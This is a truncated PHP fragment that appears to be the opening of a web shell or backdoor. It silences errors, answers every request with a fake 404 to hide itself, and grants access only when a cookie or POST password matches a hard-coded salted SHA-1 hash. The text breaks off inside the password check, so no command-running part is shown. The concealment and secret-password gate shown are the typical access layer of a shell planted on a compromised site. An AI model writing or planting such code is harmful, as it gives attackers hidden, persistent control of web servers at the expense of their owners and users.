...
https://docs.google.com/document/u/0/afd855be96b741df4a47acf05e72aef4
*/
error_reporting(0);
http_response_code(404);
$auth_key = "657f04aa20451956b84558b2ffc9cd625731db57";
$pass = false;
if (isset($_COOKIE['pass'])) { 
	if(sha1($_COOKIE['pass']."#&gu&&2a^") == $auth_key) { 
		$pass = true; 
	}
} else { 
	if (isset($_POST['pass'])) { 
		if(sha1($_POST['pass']."#&gu&&2a^") == $auth_key) { 
